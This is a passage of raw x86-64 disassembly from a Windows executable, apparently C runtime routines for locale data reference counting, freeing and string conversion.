   1400071cb:	74 05                	je     0x1400071d2
   1400071cd:	e8 6e d5 ff ff       	call   0x140004740
   1400071d2:	48 83 c4 20          	add    $0x20,%rsp
   1400071d6:	5b                   	pop    %rbx
   1400071d7:	c3                   	ret
   1400071d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400071dd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400071e2:	57                   	push   %rdi
   1400071e3:	48 83 ec 20          	sub    $0x20,%rsp
   1400071e7:	33 ff                	xor    %edi,%edi
   1400071e9:	48 8d 04 d1          	lea    (%rcx,%rdx,8),%rax
   1400071ed:	48 8b f0             	mov    %rax,%rsi
   1400071f0:	48 8b d9             	mov    %rcx,%rbx
   1400071f3:	48 2b f1             	sub    %rcx,%rsi
   1400071f6:	48 83 c6 07          	add    $0x7,%rsi
   1400071fa:	48 c1 ee 03          	shr    $0x3,%rsi
   1400071fe:	48 3b c8             	cmp    %rax,%rcx
   140007201:	48 0f 47 f7          	cmova  %rdi,%rsi
   140007205:	48 85 f6             	test   %rsi,%rsi
   140007208:	74 14                	je     0x14000721e
   14000720a:	48 8b 0b             	mov    (%rbx),%rcx
   14000720d:	e8 2e d5 ff ff       	call   0x140004740
   140007212:	48 ff c7             	inc    %rdi
   140007215:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   140007219:	48 3b fe             	cmp    %rsi,%rdi
   14000721c:	75 ec                	jne    0x14000720a
   14000721e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007223:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007228:	48 83 c4 20          	add    $0x20,%rsp
   14000722c:	5f                   	pop    %rdi
   14000722d:	c3                   	ret
   14000722e:	90                   	nop
   14000722f:	90                   	nop
   140007230:	48 85 c9             	test   %rcx,%rcx
   140007233:	0f 84 fe 00 00 00    	je     0x140007337
   140007239:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000723e:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007243:	56                   	push   %rsi
   140007244:	48 83 ec 20          	sub    $0x20,%rsp
   140007248:	bd 07 00 00 00       	mov    $0x7,%ebp
   14000724d:	48 8b d9             	mov    %rcx,%rbx
   140007250:	8b d5                	mov    %ebp,%edx
   140007252:	e8 81 ff ff ff       	call   0x1400071d8
   140007257:	48 8d 4b 38          	lea    0x38(%rbx),%rcx
   14000725b:	8b d5                	mov    %ebp,%edx
   14000725d:	e8 76 ff ff ff       	call   0x1400071d8
   140007262:	8d 75 05             	lea    0x5(%rbp),%esi
   140007265:	8b d6                	mov    %esi,%edx
   140007267:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   14000726b:	e8 68 ff ff ff       	call   0x1400071d8
   140007270:	48 8d 8b d0 00 00 00 	lea    0xd0(%rbx),%rcx
   140007277:	8b d6                	mov    %esi,%edx
   140007279:	e8 5a ff ff ff       	call   0x1400071d8
   14000727e:	48 8d 8b 30 01 00 00 	lea    0x130(%rbx),%rcx
   140007285:	8d 55 fb             	lea    -0x5(%rbp),%edx
   140007288:	e8 4b ff ff ff       	call   0x1400071d8
   14000728d:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   140007294:	e8 a7 d4 ff ff       	call   0x140004740
   140007299:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   1400072a0:	e8 9b d4 ff ff       	call   0x140004740
   1400072a5:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   1400072ac:	e8 8f d4 ff ff       	call   0x140004740
   1400072b1:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   1400072b8:	8b d5                	mov    %ebp,%edx
   1400072ba:	e8 19 ff ff ff       	call   0x1400071d8
   1400072bf:	48 8d 8b 98 01 00 00 	lea    0x198(%rbx),%rcx
   1400072c6:	8b d5                	mov    %ebp,%edx
   1400072c8:	e8 0b ff ff ff       	call   0x1400071d8
   1400072cd:	48 8d 8b d0 01 00 00 	lea    0x1d0(%rbx),%rcx
   1400072d4:	8b d6                	mov    %esi,%edx
   1400072d6:	e8 fd fe ff ff       	call   0x1400071d8
   1400072db:	48 8d 8b 30 02 00 00 	lea    0x230(%rbx),%rcx
   1400072e2:	8b d6                	mov    %esi,%edx
   1400072e4:	e8 ef fe ff ff       	call   0x1400071d8
   1400072e9:	48 8d 8b 90 02 00 00 	lea    0x290(%rbx),%rcx
   1400072f0:	8d 55 fb             	lea    -0x5(%rbp),%edx
   1400072f3:	e8 e0 fe ff ff       	call   0x1400071d8
   1400072f8:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   1400072ff:	e8 3c d4 ff ff       	call   0x140004740
   140007304:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   14000730b:	e8 30 d4 ff ff       	call   0x140004740
   140007310:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   140007317:	e8 24 d4 ff ff       	call   0x140004740
   14000731c:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   140007323:	e8 18 d4 ff ff       	call   0x140004740
   140007328:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000732d:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007332:	48 83 c4 20          	add    $0x20,%rsp
   140007336:	5e                   	pop    %rsi
   140007337:	c3                   	ret
   140007338:	48 83 ec 28          	sub    $0x28,%rsp
   14000733c:	e8 6f dd ff ff       	call   0x1400050b0
   140007341:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140007346:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   14000734d:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007352:	48 8b c8             	mov    %rax,%rcx
   140007355:	e8 52 0c 00 00       	call   0x140007fac
   14000735a:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000735f:	48 8b 00             	mov    (%rax),%rax
   140007362:	48 83 c4 28          	add    $0x28,%rsp
   140007366:	c3                   	ret
   140007367:	90                   	nop
   140007368:	55                   	push   %rbp
   140007369:	41 54                	push   %r12
   14000736b:	41 55                	push   %r13
   14000736d:	41 56                	push   %r14
   14000736f:	41 57                	push   %r15
   140007371:	48 83 ec 60          	sub    $0x60,%rsp
   140007375:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000737a:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   14000737e:	48 89 75 68          	mov    %rsi,0x68(%rbp)
   140007382:	48 89 7d 70          	mov    %rdi,0x70(%rbp)
   140007386:	48 8b 05 8b dc 00 00 	mov    0xdc8b(%rip),%rax        # 0x140015018
   14000738d:	48 33 c5             	xor    %rbp,%rax
   140007390:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140007394:	44 8b ea             	mov    %edx,%r13d
   140007397:	45 8b f9             	mov    %r9d,%r15d
   14000739a:	48 8b d1             	mov    %rcx,%rdx
   14000739d:	4d 8b e0             	mov    %r8,%r12
   1400073a0:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400073a4:	e8 07 d5 ff ff       	call   0x1400048b0
   1400073a9:	8b b5 88 00 00 00    	mov    0x88(%rbp),%esi
   1400073af:	85 f6                	test   %esi,%esi
   1400073b1:	75 07                	jne    0x1400073ba
   1400073b3:	48 8b 45 08          	mov    0x8(%rbp),%rax
   1400073b7:	8b 70 0c             	mov    0xc(%rax),%esi
   1400073ba:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   1400073c0:	45 8b cf             	mov    %r15d,%r9d
   1400073c3:	4d 8b c4             	mov    %r12,%r8
   1400073c6:	8b ce                	mov    %esi,%ecx
   1400073c8:	1b d2                	sbb    %edx,%edx
   1400073ca:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1400073cf:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400073d5:	83 e2 08             	and    $0x8,%edx
   1400073d8:	ff c2                	inc    %edx
   1400073da:	ff 15 98 4d 00 00    	call   *0x4d98(%rip)        # 0x14000c178
   1400073e0:	4c 63 f0             	movslq %eax,%r14
   1400073e3:	85 c0                	test   %eax,%eax
   1400073e5:	75 07                	jne    0x1400073ee
   1400073e7:	33 ff                	xor    %edi,%edi
   1400073e9:	e9 f1 00 00 00       	jmp    0x1400074df
   1400073ee:	49 8b fe             	mov    %r14,%rdi
   1400073f1:	48 03 ff             	add    %rdi,%rdi
   1400073f4:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   1400073f8:	48 3b f9             	cmp    %rcx,%rdi
   1400073fb:	48 1b c0             	sbb    %rax,%rax
   1400073fe:	48 85 c1             	test   %rax,%rcx
   140007401:	74 75                	je     0x140007478
   140007403:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140007407:	48 3b f9             	cmp    %rcx,%rdi
   14000740a:	48 1b c0             	sbb    %rax,%rax
   14000740d:	48 23 c1             	and    %rcx,%rax
   140007410:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   140007416:	48 8d 47 10          	lea    0x10(%rdi),%rax
   14000741a:	77 3a                	ja     0x140007456
   14000741c:	48 3b f8             	cmp    %rax,%rdi
   14000741f:	48 1b c9             	sbb    %rcx,%rcx
   140007422:	48 23 c8             	and    %rax,%rcx
   140007425:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   140007429:	48 3b c1             	cmp    %rcx,%rax
   14000742c:	77 0a                	ja     0x140007438
   14000742e:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   140007435:	ff ff 0f 
   140007438:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000743c:	e8 ff 3f 00 00       	call   0x14000b440
   140007441:	48 2b e0             	sub    %rax,%rsp
   140007444:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   140007449:	48 85 db             	test   %rbx,%rbx
   14000744c:	74 79                	je     0x1400074c7
   14000744e:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   140007454:	eb 1c                	jmp    0x140007472
   140007456:	48 3b f8             	cmp    %rax,%rdi
   140007459:	48 1b c9             	sbb    %rcx,%rcx
   14000745c:	48 23 c8             	and    %rax,%rcx
   14000745f:	e8 1c d3 ff ff       	call   0x140004780
   140007464:	48 8b d8             	mov    %rax,%rbx
   140007467:	48 85 c0             	test   %rax,%rax
   14000746a:	74 0e                	je     0x14000747a
   14000746c:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   140007472:	48 83 c3 10          	add    $0x10,%rbx
   140007476:	eb 02                	jmp    0x14000747a
   140007478:	33 db                	xor    %ebx,%ebx
   14000747a:	48 85 db             	test   %rbx,%rbx
   14000747d:	74 48                	je     0x1400074c7
   14000747f:	4c 8b c7             	mov    %rdi,%r8
   140007482:	33 d2                	xor    %edx,%edx
   140007484:	48 8b cb             	mov    %rbx,%rcx
   140007487:	e8 34 b3 ff ff       	call   0x1400027c0
   14000748c:	45 8b cf             	mov    %r15d,%r9d
   14000748f:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140007494:	4d 8b c4             	mov    %r12,%r8
   140007497:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000749c:	ba 01 00 00 00       	mov    $0x1,%edx
   1400074a1:	8b ce                	mov    %esi,%ecx
   1400074a3:	ff 15 cf 4c 00 00    	call   *0x4ccf(%rip)        # 0x14000c178
   1400074a9:	85 c0                	test   %eax,%eax
   1400074ab:	74 1a                	je     0x1400074c7
   1400074ad:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   1400074b4:	44 8b c0             	mov    %eax,%r8d
   1400074b7:	48 8b d3             	mov    %rbx,%rdx
   1400074ba:	41 8b cd             	mov    %r13d,%ecx
   1400074bd:	ff 15 65 4d 00 00    	call   *0x4d65(%rip)        # 0x14000c228
   1400074c3:	8b f8                	mov    %eax,%edi
   1400074c5:	eb 02                	jmp    0x1400074c9
   1400074c7:	33 ff                	xor    %edi,%edi
   1400074c9:	48 85 db             	test   %rbx,%rbx
   1400074cc:	74 11                	je     0x1400074df
   1400074ce:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   1400074d2:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   1400074d8:	75 05                	jne    0x1400074df
   1400074da:	e8 61 d2 ff ff       	call   0x140004740
   1400074df:	80 7d 18 00          	cmpb   $0x0,0x18(%rbp)
   1400074e3:	74 0b                	je     0x1400074f0
   1400074e5:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400074e9:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400074f0:	8b c7                	mov    %edi,%eax
   1400074f2:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   1400074f6:	48 33 cd             	xor    %rbp,%rcx
   1400074f9:	e8 a2 a5 ff ff       	call   0x140001aa0
   1400074fe:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   140007502:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   140007506:	48 8b 7d 70          	mov    0x70(%rbp),%rdi
   14000750a:	48 8d 65 30          	lea    0x30(%rbp),%rsp
   14000750e:	41 5f                	pop    %r15
   140007510:	41 5e                	pop    %r14
   140007512:	41 5d                	pop    %r13
   140007514:	41 5c                	pop    %r12
   140007516:	5d                   	pop    %rbp
   140007517:	c3                   	ret
   140007518:	f0 ff 41 10          	lock incl 0x10(%rcx)
   14000751c:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   140007523:	48 85 c0             	test   %rax,%rax
   140007526:	74 03                	je     0x14000752b
   140007528:	f0 ff 00             	lock incl (%rax)
   14000752b:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   140007532:	48 85 c0             	test   %rax,%rax
   140007535:	74 03                	je     0x14000753a
   140007537:	f0 ff 00             	lock incl (%rax)
   14000753a:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   140007541:	48 85 c0             	test   %rax,%rax
   140007544:	74 03                	je     0x140007549
   140007546:	f0 ff 00             	lock incl (%rax)
   140007549:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140007550:	48 85 c0             	test   %rax,%rax
   140007553:	74 03                	je     0x140007558
   140007555:	f0 ff 00             	lock incl (%rax)
   140007558:	48 8d 41 38          	lea    0x38(%rcx),%rax
   14000755c:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140007562:	48 8d 15 ef e1 00 00 	lea    0xe1ef(%rip),%rdx        # 0x140015758
   140007569:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   14000756d:	74 0b                	je     0x14000757a
   14000756f:	48 8b 10             	mov    (%rax),%rdx
   140007572:	48 85 d2             	test   %rdx,%rdx
   140007575:	74 03                	je     0x14000757a
   140007577:	f0 ff 02             	lock incl (%rdx)
   14000757a:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   14000757f:	74 0c                	je     0x14000758d
   140007581:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140007585:	48 85 d2             	test   %rdx,%rdx
   140007588:	74 03                	je     0x14000758d
   14000758a:	f0 ff 02             	lock incl (%rdx)
   14000758d:	48 83 c0 20          	add    $0x20,%rax
   140007591:	49 83 e8 01          	sub    $0x1,%r8
   140007595:	75 cb                	jne    0x140007562
   140007597:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   14000759e:	e9 7d 01 00 00       	jmp    0x140007720
   1400075a3:	90                   	nop
   1400075a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400075a9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400075ae:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400075b3:	57                   	push   %rdi
   1400075b4:	48 83 ec 20          	sub    $0x20,%rsp
   1400075b8:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   1400075bf:	48 8b d9             	mov    %rcx,%rbx
   1400075c2:	48 85 c0             	test   %rax,%rax
   1400075c5:	74 79                	je     0x140007640
   1400075c7:	48 8d 0d 92 e1 00 00 	lea    0xe192(%rip),%rcx        # 0x140015760
   1400075ce:	48 3b c1             	cmp    %rcx,%rax
   1400075d1:	74 6d                	je     0x140007640
   1400075d3:	48 8b 83 e0 00 00 00 	mov    0xe0(%rbx),%rax
   1400075da:	48 85 c0             	test   %rax,%rax
   1400075dd:	74 61                	je     0x140007640
   1400075df:	83 38 00             	cmpl   $0x0,(%rax)
   1400075e2:	75 5c                	jne    0x140007640
   1400075e4:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   1400075eb:	48 85 c9             	test   %rcx,%rcx
   1400075ee:	74 16                	je     0x140007606
   1400075f0:	83 39 00             	cmpl   $0x0,(%rcx)
   1400075f3:	75 11                	jne    0x140007606
   1400075f5:	e8 46 d1 ff ff       	call   0x140004740
   1400075fa:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140007601:	e8 5a fa ff ff       	call   0x140007060
   140007606:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   14000760d:	48 85 c9             	test   %rcx,%rcx
   140007610:	74 16                	je     0x140007628
   140007612:	83 39 00             	cmpl   $0x0,(%rcx)
   140007615:	75 11                	jne    0x140007628
   140007617:	e8 24 d1 ff ff       	call   0x140004740
   14000761c:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140007623:	e8 44 fb ff ff       	call   0x14000716c
   140007628:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   14000762f:	e8 0c d1 ff ff       	call   0x140004740
   140007634:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000763b:	e8 00 d1 ff ff       	call   0x140004740
   140007640:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   140007647:	48 85 c0             	test   %rax,%rax
   14000764a:	74 47                	je     0x140007693
   14000764c:	83 38 00             	cmpl   $0x0,(%rax)
   14000764f:	75 42                	jne    0x140007693
   140007651:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   140007658:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   14000765f:	e8 dc d0 ff ff       	call   0x140004740
   140007664:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   14000766b:	bf 80 00 00 00       	mov    $0x80,%edi
   140007670:	48 2b cf             	sub    %rdi,%rcx
   140007673:	e8 c8 d0 ff ff       	call   0x140004740
   140007678:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   14000767f:	48 2b cf             	sub    %rdi,%rcx
   140007682:	e8 b9 d0 ff ff       	call   0x140004740
   140007687:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   14000768e:	e8 ad d0 ff ff       	call   0x140004740
   140007693:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   14000769a:	e8 a9 00 00 00       	call   0x140007748
   14000769f:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   1400076a6:	bd 06 00 00 00       	mov    $0x6,%ebp
   1400076ab:	48 8d 7b 38          	lea    0x38(%rbx),%rdi
   1400076af:	48 8d 05 a2 e0 00 00 	lea    0xe0a2(%rip),%rax        # 0x140015758
   1400076b6:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   1400076ba:	74 1a                	je     0x1400076d6
   1400076bc:	48 8b 0f             	mov    (%rdi),%rcx
   1400076bf:	48 85 c9             	test   %rcx,%rcx
   1400076c2:	74 12                	je     0x1400076d6
   1400076c4:	83 39 00             	cmpl   $0x0,(%rcx)
   1400076c7:	75 0d                	jne    0x1400076d6
   1400076c9:	e8 72 d0 ff ff       	call   0x140004740
   1400076ce:	48 8b 0e             	mov    (%rsi),%rcx
   1400076d1:	e8 6a d0 ff ff       	call   0x140004740
   1400076d6:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   1400076db:	74 13                	je     0x1400076f0
   1400076dd:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   1400076e1:	48 85 c9             	test   %rcx,%rcx
   1400076e4:	74 0a                	je     0x1400076f0
   1400076e6:	83 39 00             	cmpl   $0x0,(%rcx)
   1400076e9:	75 05                	jne    0x1400076f0
   1400076eb:	e8 50 d0 ff ff       	call   0x140004740
   1400076f0:	48 83 c6 08          	add    $0x8,%rsi
   1400076f4:	48 83 c7 20          	add    $0x20,%rdi
   1400076f8:	48 83 ed 01          	sub    $0x1,%rbp
   1400076fc:	75 b1                	jne    0x1400076af
   1400076fe:	48 8b cb             	mov    %rbx,%rcx
   140007701:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007706:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000770b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007710:	48 83 c4 20          	add    $0x20,%rsp
   140007714:	5f                   	pop    %rdi
   140007715:	e9 26 d0 ff ff       	jmp    0x140004740
   14000771a:	90                   	nop
   14000771b:	90                   	nop
   14000771c:	90                   	nop
   14000771d:	90                   	nop
   14000771e:	90                   	nop
   14000771f:	90                   	nop
   140007720:	48 85 c9             	test   %rcx,%rcx
   140007723:	74 1c                	je     0x140007741
   140007725:	48 8d 05 d4 57 00 00 	lea    0x57d4(%rip),%rax        # 0x14000cf00
   14000772c:	48 3b c8             	cmp    %rax,%rcx
   14000772f:	74 10                	je     0x140007741
   140007731:	b8 01 00 00 00       	mov    $0x1,%eax
   140007736:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   14000773d:	00 
   14000773e:	ff c0                	inc    %eax
   140007740:	c3                   	ret
   140007741:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   140007746:	c3                   	ret
   140007747:	90                   	nop
   140007748:	48 85 c9             	test   %rcx,%rcx
   14000774b:	74 30                	je     0x14000777d
   14000774d:	53                   	push   %rbx
   14000774e:	48 83 ec 20          	sub    $0x20,%rsp
   140007752:	48 8d 05 a7 57 00 00 	lea    0x57a7(%rip),%rax        # 0x14000cf00
   140007759:	48 8b d9             	mov    %rcx,%rbx
   14000775c:	48 3b c8             	cmp    %rax,%rcx
   14000775f:	74 17                	je     0x140007778
   140007761:	8b 81 5c 01 00 00    	mov    0x15c(%rcx),%eax
   140007767:	85 c0                	test   %eax,%eax
   140007769:	75 0d                	jne    0x140007778
   14000776b:	e8 c0 fa ff ff       	call   0x140007230
   140007770:	48 8b cb             	mov    %rbx,%rcx
   140007773:	e8 c8 cf ff ff       	call   0x140004740
   140007778:	48 83 c4 20          	add    $0x20,%rsp
   14000777c:	5b                   	pop    %rbx
   14000777d:	c3                   	ret
   14000777e:	90                   	nop
   14000777f:	90                   	nop
   140007780:	48 85 c9             	test   %rcx,%rcx
   140007783:	74 1a                	je     0x14000779f
   140007785:	48 8d 05 74 57 00 00 	lea    0x5774(%rip),%rax        # 0x14000cf00
   14000778c:	48 3b c8             	cmp    %rax,%rcx
   14000778f:	74 0e                	je     0x14000779f
   140007791:	83 c8 ff             	or     $0xffffffff,%eax
   140007794:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   14000779b:	00 
   14000779c:	ff c8                	dec    %eax
   14000779e:	c3                   	ret
   14000779f:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   1400077a4:	c3                   	ret
   1400077a5:	90                   	nop
   1400077a6:	90                   	nop
   1400077a7:	90                   	nop
   1400077a8:	48 83 ec 28          	sub    $0x28,%rsp
   1400077ac:	48 85 c9             	test   %rcx,%rcx
   1400077af:	0f 84 96 00 00 00    	je     0x14000784b
   1400077b5:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400077b9:	f0 44 01 49 10       	lock add %r9d,0x10(%rcx)
   1400077be:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   1400077c5:	48 85 c0             	test   %rax,%rax
   1400077c8:	74 04                	je     0x1400077ce
   1400077ca:	f0 44 01 08          	lock add %r9d,(%rax)
   1400077ce:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   1400077d5:	48 85 c0             	test   %rax,%rax
   1400077d8:	74 04                	je     0x1400077de
   1400077da:	f0 44 01 08          	lock add %r9d,(%rax)
   1400077de:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   1400077e5:	48 85 c0             	test   %rax,%rax
   1400077e8:	74 04                	je     0x1400077ee
   1400077ea:	f0 44 01 08          	lock add %r9d,(%rax)
   1400077ee:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   1400077f5:	48 85 c0             	test   %rax,%rax
   1400077f8:	74 04                	je     0x1400077fe
   1400077fa:	f0 44 01 08          	lock add %r9d,(%rax)
   1400077fe:	48 8d 41 38          	lea    0x38(%rcx),%rax
   140007802:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140007808:	48 8d 15 49 df 00 00 	lea    0xdf49(%rip),%rdx        # 0x140015758
   14000780f:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140007813:	74 0c                	je     0x140007821
   140007815:	48 8b 10             	mov    (%rax),%rdx
   140007818:	48 85 d2             	test   %rdx,%rdx
   14000781b:	74 04                	je     0x140007821
   14000781d:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140007821:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   140007826:	74 0d                	je     0x140007835
   140007828:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   14000782c:	48 85 d2             	test   %rdx,%rdx
   14000782f:	74 04                	je     0x140007835
   140007831:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140007835:	48 83 c0 20          	add    $0x20,%rax
   140007839:	49 83 e8 01          	sub    $0x1,%r8
   14000783d:	75 c9                	jne    0x140007808
   14000783f:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   140007846:	e8 35 ff ff ff       	call   0x140007780
   14000784b:	48 83 c4 28          	add    $0x28,%rsp
   14000784f:	c3                   	ret
   140007850:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007855:	57                   	push   %rdi
   140007856:	48 83 ec 20          	sub    $0x20,%rsp
   14000785a:	e8 51 d8 ff ff       	call   0x1400050b0
   14000785f:	48 8b f8             	mov    %rax,%rdi
   140007862:	8b 0d 98 df 00 00    	mov    0xdf98(%rip),%ecx        # 0x140015800
   140007868:	85 88 a8 03 00 00    	test   %ecx,0x3a8(%rax)
   14000786e:	74 0c                	je     0x14000787c
   140007870:	48 8b 98 90 00 00 00 	mov    0x90(%rax),%rbx
   140007877:	48 85 db             	test   %rbx,%rbx
   14000787a:	75 36                	jne    0x1400078b2
   14000787c:	b9 04 00 00 00       	mov    $0x4,%ecx
   140007881:	e8 f6 eb ff ff       	call   0x14000647c
   140007886:	90                   	nop
   140007887:	48 8d 8f 90 00 00 00 	lea    0x90(%rdi),%rcx
   14000788e:	48 8b 15 83 f1 00 00 	mov    0xf183(%rip),%rdx        # 0x140016a18
   140007895:	e8 26 00 00 00       	call   0x1400078c0
   14000789a:	48 8b d8             	mov    %rax,%rbx
   14000789d:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400078a2:	e8 29 ec ff ff       	call   0x1400064d0
   1400078a7:	48 85 db             	test   %rbx,%rbx
   1400078aa:	75 06                	jne    0x1400078b2
   1400078ac:	e8 2f cf ff ff       	call   0x1400047e0
   1400078b1:	cc                   	int3
   1400078b2:	48 8b c3             	mov    %rbx,%rax
   1400078b5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400078ba:	48 83 c4 20          	add    $0x20,%rsp
   1400078be:	5f                   	pop    %rdi
   1400078bf:	c3                   	ret
   1400078c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400078c5:	57                   	push   %rdi
   1400078c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400078ca:	48 8b fa             	mov    %rdx,%rdi
   1400078cd:	48 85 d2             	test   %rdx,%rdx
   1400078d0:	74 49                	je     0x14000791b
   1400078d2:	48 85 c9             	test   %rcx,%rcx
   1400078d5:	74 44                	je     0x14000791b
   1400078d7:	48 8b 19             	mov    (%rcx),%rbx
   1400078da:	48 3b da             	cmp    %rdx,%rbx
   1400078dd:	75 05                	jne    0x1400078e4
   1400078df:	48 8b c2             	mov    %rdx,%rax
   1400078e2:	eb 39                	jmp    0x14000791d
   1400078e4:	48 89 11             	mov    %rdx,(%rcx)
   1400078e7:	48 8b ca             	mov    %rdx,%rcx
   1400078ea:	e8 29 fc ff ff       	call   0x140007518
   1400078ef:	48 85 db             	test   %rbx,%rbx
   1400078f2:	74 22                	je     0x140007916
   1400078f4:	48 8b cb             	mov    %rbx,%rcx
   1400078f7:	e8 ac fe ff ff       	call   0x1400077a8
   1400078fc:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   140007900:	75 14                	jne    0x140007916
   140007902:	48 8d 05 e7 dc 00 00 	lea    0xdce7(%rip),%rax        # 0x1400155f0
   140007909:	48 3b d8             	cmp    %rax,%rbx
   14000790c:	74 08                	je     0x140007916
   14000790e:	48 8b cb             	mov    %rbx,%rcx
   140007911:	e8 8e fc ff ff       	call   0x1400075a4
   140007916:	48 8b c7             	mov    %rdi,%rax
   140007919:	eb 02                	jmp    0x14000791d
   14000791b:	33 c0                	xor    %eax,%eax
   14000791d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007922:	48 83 c4 20          	add    $0x20,%rsp
   140007926:	5f                   	pop    %rdi
   140007927:	c3                   	ret
   140007928:	eb 06                	jmp    0x140007930
   14000792a:	90                   	nop
   14000792b:	90                   	nop
   14000792c:	90                   	nop
   14000792d:	90                   	nop
   14000792e:	90                   	nop
   14000792f:	90                   	nop
